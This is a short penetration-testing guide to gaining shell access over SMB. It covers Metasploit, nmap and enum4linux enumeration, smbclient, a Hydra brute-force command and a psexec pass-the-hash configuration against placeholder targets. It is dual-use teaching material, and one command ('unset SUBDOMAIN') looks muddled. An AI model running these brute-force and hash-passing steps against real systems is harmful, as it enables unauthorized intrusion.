# 🎊 Gaining Shell with SMB

## Gaining Shell with SMB Shares: Metasploit and Manual Exploitation

This documentation provides a step-by-step guide on how to gain shell access using SMB shares, utilizing both Metasploit and manual exploitation techniques.

### 1. Introduction

**Server Message Block (SMB):** SMB is a network protocol used for file and printer sharing. Vulnerabilities in SMB implementations can be exploited to gain unauthorized access.

### 2. Prerequisites

* **Kali Linux:** Used for carrying out penetration testing.
* **Metasploit:** A penetration testing framework.
* **Target System:** A Windows machine with open SMB shares.

### 3. Metasploit Exploitation

#### Using Metasploit to Exploit SMB

```bash
# Open Metasploit Console
msfconsole

# Search for SMB exploits
search smb

# Select a suitable exploit
use exploit/windows/smb/...

# Set required parameters
set RHOSTS <target_ip>

# Run the exploit
exploit
```

##

## Manual Exploitation of SMB Shares

Manual exploitation of SMB (Server Message Block) shares involves identifying, interacting with, and exploiting open shares on a target system. This guide provides a detailed walkthrough of the manual exploitation process.

### Table of Contents

1. **Identifying Open SMB Shares**
   * Using tools like `nmap` and `enum4linux` to discover accessible shares.
2. **Interacting with SMB Shares**
   * Utilizing tools like `smbclient` for basic interaction and enumeration.
3. **Brute-Force Attacks on SMB Shares**
   * Employing tools like `Hydra` to perform brute-force attacks on weak passwords.
4. **Leveraging Vulnerabilities**
   * Exploiting known vulnerabilities in SMB implementations.

***

### 1. Identifying Open SMB Shares

#### Using nmap to Identify Open SMB Ports

```bash
nmap -p 139,445 --script smb-enum-shares <target_ip>
```

#### Using enum4linux for Enumeration

```bash
enum4linux -a <target_ip>
```

### 2. Interacting with SMB Shares

#### Basic Interaction with smbclient

```bash
smbclient //<target_ip>/share_name -U username
```

#### Enumerating Shares

```bash
smbclient -L //<target_ip> -U username
```

### 3. Brute-Force Attacks on SMB Shares

#### Using Hydra for Brute-Force

```bash
hydra -l username -P /path/to/password_list smb://<target_ip>
```

### 4. Metasploit Exploitation and Hash Exploitation

#### Setting Hash for Administrator

```
use exploit/windows/smb/psexec
set RHOSTS <target_ip>
set SMBPass <hash_of_admin>
set SMBUser Administrator
exploit
```

#### Unsetting Subdomain for Hash Pass

```
unset SUBDOMAIN
```
